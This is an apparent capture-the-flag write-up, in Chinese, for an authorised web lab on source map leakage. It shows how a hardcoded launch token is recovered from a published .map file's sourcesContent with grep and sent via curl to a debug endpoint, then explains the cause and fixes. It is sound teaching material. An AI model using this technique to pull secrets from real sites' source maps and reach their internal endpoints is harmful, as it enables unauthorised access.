# CTF 练习：被一起发布的源码地图（Source Map 泄露）

> 平台：CTF² / Daily Hack（Web · Easy · 100 分）
> 环境：Kali Linux + Firefox + curl
> 日期：2026-11-10
> 性质：平台提供的授权靶场

---

## 一、目标

发布的三份静态资源里恢复 `launch token`，再用 `X-Launch-Token` 请求头访问 `http://靶机/internal/debug`，拿到 `flag{...}`。

## 二、附件

| 文件 | 大小 | 内容 |
|---|---|---|
| `index.html` | 879 B | 门户首页，含构建信息与 TODO 清单 |
| `app.min.js` | 382 B | 压缩后的前端脚本，末尾引用 sourceMappingURL |
| `app.min.js.map` | 582 B | **源码地图，含还原后的原始源码** |

## 三、复现过程

### 3.1 先看 index.html：TODO 直接暴露了问题

```html
<!--
  build: 2026-08-30-b17
  TODO(infra) 上线检查清单：
    [x] 用 assets/app.min.js 替换未压缩版本
    [ ] 确认 assets/app.min.js.map 是否需要移出发布目录（信息泄露检查项）
    [ ] 上线前轮换 /internal/debug 使用的 launch token（当前仅联调环境使用）
-->
```

**三条备注正好对应三个真实事故**：地图没移出发布目录、调试接口还在、token 没轮换。

### 3.2 看 app.min.js：有诱饵

```js
const T = atob("...");           // 一个 base64 编码的字符串
```

解码后是：

```
flag{DAILY_??I_?PLACE_000000000000~
```

**这是诱饵**（`PLACE_000000000000` 是占位符），不是真 token。

### 3.3 看 app.min.js.map：真 token 在这里

源码地图里的 `sourcesContent` 保存了原始源码：

```js
// src/app.js — 内部源码，请勿随产物一起发布
// TODO(ops): 上线前必须轮换 launch token，当前值仅用于联调环境
const LAUNCH_TOKEN = 'flag{d21d964881ee70f433c79d44ff62178b5}';
```

提取命令：

```bash
grep -o "LAUNCH_TOKEN = '[^']*'" app.min.js.map
```

### 3.4 启动靶机并请求接口

```bash
curl -H 'X-Launch-Token: flag{d21d964881ee70f433c79d44ff62178b5}' \
  http://xxxx.http-ctf2.dasctf.com/internal/debug
```

响应：

```json
{"debug": true, "flag": "CTF2{d3a33c02-7456-47e1-a6f8-31068135d18b}"}
```

**拿到 flag。**

## 四、原理：Source Map 泄露

前端构建时会把源码压缩、混淆，同时生成 `.map` 文件，记录「压缩代码 ↔ 原始代码」的对应关系，方便调试。

**如果 `.map` 被一起发布到生产环境且可访问**，攻击者就能：

| 能拿到什么 | 危害 |
|---|---|
| 原始源码（`sourcesContent`） | 完整逻辑、接口地址、参数结构 |
| 注释（TODO/FIXME） | 内部信息、未完成的安全项 |
| 硬编码的 token / 密钥 | 直接访问内部接口 |

本题的 token 就是硬编码在源码里、又被 map 泄露出来的。

## 五、修复

| 措施 | 说明 |
|---|---|
| **不发布 `.map`** | 构建配置里关闭 sourcemap，或发布前删除 |
| 调试接口下线/鉴权 | `/internal/debug` 不应暴露在公网 |
| token 轮换 + 环境隔离 | 联调 token 不能上生产 |
| 硬编码密钥清理 | 用环境变量/密钥管理，不进源码 |
| CI 检查 | 发布前扫描产物里是否含 `.map`、token、注释 |

## 六、踩坑

1. **有诱饵**：`app.min.js` 里的 base64 解码结果是假 flag（`PLACE_000...`），别直接提交。
2. **大括号在 shell 里是特殊字符**：curl 的 header 值要用**单引号**包住。
3. **字体混淆**：`l`（小写 L）和 `1`、`I` 长得像，提取 token 时用 `grep` 而不是肉眼看。
4. **URL 不带端口**：这题靶机是 `http://xxxx.http-ctf2.dasctf.com/`，不是 IP:端口。

## 七、收获

- 理解了 source map 是什么、为什么会泄露源码。
- 学会了从 `.map` 的 `sourcesContent` 里还原源码、提取硬编码常量。
- 认识到「注释和构建产物」也是信息泄露面：TODO 里的三行备注，就是三个真实漏洞。
